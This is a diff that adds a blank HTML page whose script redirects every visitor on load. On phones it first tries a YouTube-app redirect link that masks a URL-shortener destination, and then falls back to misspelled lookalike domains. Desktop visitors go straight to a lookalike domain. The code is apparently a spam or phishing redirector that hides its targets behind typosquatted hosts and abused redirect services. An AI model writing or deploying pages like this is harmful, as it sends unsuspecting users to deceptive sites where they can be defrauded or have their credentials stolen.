@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title></title>
+    </head>
+    <body>
+        <script type="text/javascript">
+            window.onload = function() {
+
+                var desktopFallback = "https://clivckhneremvnow.my.cnanva.site",
+                mobileFallback = "https://clickhveremvnnow.my.cannva.site",
+                app = "vnd.youtube:www.youtube.com/redirect?event=comments&redir_token=QUFFLUhqbFR0TkVPRUZjOWp4WnJLNUhNRnZFYlMyVVJsd3xBQ3Jtc0ttejB3Y2xvYkpfa0ZxaXJwemdwajlOdFBiR0ZqalJHbmg4c1A2QjJWLTh1TG03Y1ZTRmZnN3dPTzFGVWx3aDltdlBXaGcyT04tbFM4Rm1vY1duajk4UkpnVFVYcXB0YnVrakpzVHVLNTNEaGE1emNNTQ&q=https%3A%2F%2Fcome.to%2Fckg4b0d7&html_redirect=1";
+
+                if( /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ) {
+                    window.location = app;
+                    window.setTimeout(function() {
+                        window.location = mobileFallback;
+                    }, 25);
+                } else {
+                    window.location = desktopFallback;
+                }
+
+                function killPopup() {
+                    window.removeEventListener('pagehide', killPopup);
+                }
+
+                window.addEventListener('pagehide', killPopup);
+
+            };
+        </script>
+    </body>
+</html>
